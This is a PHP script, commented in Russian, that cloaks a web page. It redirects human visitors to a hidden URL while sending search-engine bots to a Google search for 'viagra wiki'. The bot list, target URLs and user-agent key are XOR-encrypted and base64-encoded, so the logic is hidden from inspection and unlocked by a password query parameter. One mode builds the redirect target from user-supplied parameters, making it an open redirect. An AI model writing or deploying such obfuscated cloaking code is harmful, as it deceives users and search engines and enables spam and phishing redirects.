<?php
/* 
Этот скрипт переадресовывает всех кто перешел по ссылке, кроме гуглбота. 
Он учитывает определенные параметры. параметр "/page.php?q=main" - это пароль от зашифрованных данных.
Если дописать дополнительный параметр "/page.php?q=main&q2=main1" - означает что переадресация пройдет 
по ссылке, которая зашифрована во втором случае. 
Если указать параметр main2 вместо main1, то придется дописать еще два параметра, в которых можно указать
куда именно следует переадресовывать.
К примеру: "/page.php?q=main&q2=main2&q3=example&q4=refid=821" означает, что скрипт перейдет по ссылке
http://www.example.com/catalog/Bestsellers.htm?refid=821
*/

/*Функция зашифровки по ключу*/
function strcode($str, $passw="")
{
   $salt = "123";
   $len = strlen($str);
   $gamma = '';
   $n = $len>100 ? 8 : 2;
   while( strlen($gamma)<$len )
   {
      $gamma .= substr(pack('H*', sha1($passw.$gamma.$salt)), 0, $n);
   }
   return $str^$gamma;
}

/* Вот так можно зашифровать любую строку/текст
 * просто раскоментировать этот абзац и запустить скрипт с функцией которая выше
 * 
$txt = 'текст который нужно зашифровать здесь';
$txt = base64_encode(strcode($txt, 'main'));
echo $txt;
* 
*/

/*Здесь зашифрованы названия ботов (/google|bot|crawl|slurp|spider|yandex|rambler|ia_archiver|Teoma|MSNBot/i)*/
$data1 = "M5RQmypoeU2cO/5hs/Mr3TP9VE4tuERUWbSSGF5qz9mEygmiadhwbnolGdFeH6uUojd65oV9Q3OF7pbuUm4GOihuvjfDqzu2";
$data1 = strcode(base64_decode($data1), $_GET['q']);

/*Здесь зашифрована ссылка для первого редиректа (Location: http://www.example.com/catalog/Bestsellers.htm?refid=821)*/
$data2 = "UJxclTltc1/EdOJppPFwhXD2UFV2qVVGS6CSHVU1w8iE1gCmct0vPSNpFttBTKGUiTdk6oo7d3OE5rHuUW8CNBYTmAHB4Ga6QelvuWUhgw==";
$data2 = strcode(base64_decode($data2), $_GET['q']);

/*Здесь зашифрованы некоторый участок(Location: http://www.) второй ссылки для редиректа*/
$data3 = "UJxclTltc1/EdOJppPFwhXD2UFV2";
$data3 = strcode(base64_decode($data3), $_GET['q']);

/*Здесь зашифрованы некоторый участок(.com/catalog/Bestsellers.htm?) второй ссылки для редиректа*/
$data4 = "MpBQmWJnfUWfOOV6/8Mv2SvyQk40r0ZbBKyPEQQ=";
$data4 = strcode(base64_decode($data4), $_GET['q']);

/*Здесь зашифрована фраза (HTTP_USER_AGENT) по которой скрипт сравнивает юзерагент*/
$data5 = "VKdrpBJRT3SsC8talc8e";
$data5 = strcode(base64_decode($data5), $_GET['q']);

/*Первый случай переадресации при параметре q=main1*/
if(($_GET['q2'] === 'main1') && !preg_match("#$data1#i", $_SERVER[$data5] )){
header($data2);
die();
}
/*Второй случай переадресации при параметре q=main2. Так же нужно указать q3= и q4= (середина ссылки и окончание)*/
elseif(($_GET['q2'] === 'main2') && !preg_match("#$data1#i", $_SERVER[$data5] )){
header($data3.$_GET['q3'].$data4.$_GET['q4']);
die();
}
/*Если параметр q2 не правильный или это зашел гуглбот, то переадресовываем сюда (google.com)*/
else {
header('Location: https://www.google.com/search?q=viagra+wiki');
}

?>
